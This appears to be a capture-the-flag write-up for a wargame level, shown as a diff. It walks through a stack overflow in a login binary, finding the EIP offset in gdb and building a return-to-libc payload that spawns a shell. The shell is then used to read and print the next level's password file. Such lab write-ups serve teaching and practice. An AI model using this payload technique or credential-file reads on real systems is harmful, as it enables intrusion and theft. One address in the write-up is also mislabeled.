@@ -1,0 +1,79 @@
+When I execute the binary it asks me for a username, and whatever I put in it it says "Incorrect username"
+
+After disassembling I find out that the username needed is "dat_wil" but whatever I put in password will always result in an error so this is not the way I will use to get the real password.
+
+The program asks for 2 inputs:
+
+-first the username
+-then the password if I set "dat_wil" as username
+
+Let's try and make this binary segfault in gdb:
+
+
+(gdb) r
+Starting program: /home/users/level01/level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: dat_wil
+verifying username....
+
+Enter Password:
+AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+nope, incorrect password...
+
+
+Program received signal SIGSEGV, Segmentation fault.
+0x55555555 in ?? ()
+(gdb) info register
+eax            0x1	1
+ecx            0xffffffff	-1
+edx            0xf7fd08b8	-134412104
+ebx            0x52525252	1381126738
+esp            0xffffd6d0	0xffffd6d0
+ebp            0x54545454	0x54545454
+esi            0x0	0
+edi            0x53535353	1397969747
+eip            0x55555555	0x55555555
+eflags         0x10286	[ PF SF IF RF ]
+cs             0x23	35
+ss             0x2b	43
+ds             0x2b	43
+es             0x2b	43
+fs             0x0	0
+gs             0x63	99
+
+
+I can see that eip = 0x55555555 = "UUUU"
+
+so the offset to overwrite eip is 80.
+
+Let's try to do a return to libc exploit:
+
+In order to do that exploit I will need the address of the buffer, the address of libc system() and the address of "/bin/sh" in the machine.
+
+(gdb) p &system
+$1 = (<text variable, no debug info> *) 0xf7e6aed0 <system>
+(gdb) find &system,+9999999,"/bin/sh"
+0xf7f897ec
+
+(gdb) disas main
+...
+0x08048580 <+176>:	call   0x80484a3 <verify_user_pass>
+...
+
+system() address = 0xf7e6aed0
+"/bin/sh" address = 0xf7f897ec
+buffer address = 0x80484a3
+
+The final exploit is:
+
+$ (python -c 'print "dat_wil"'; python -c 'print "A" * 80 + "\xd0\xae\xe6\xf7" + "\xa3\x84\x08\x08" + "\xec\x97\xf8\xf7" '; cat ) | ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password:
+nope, incorrect password...
+
+whoami
+level02
+cat /home/users/level02/.pass
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
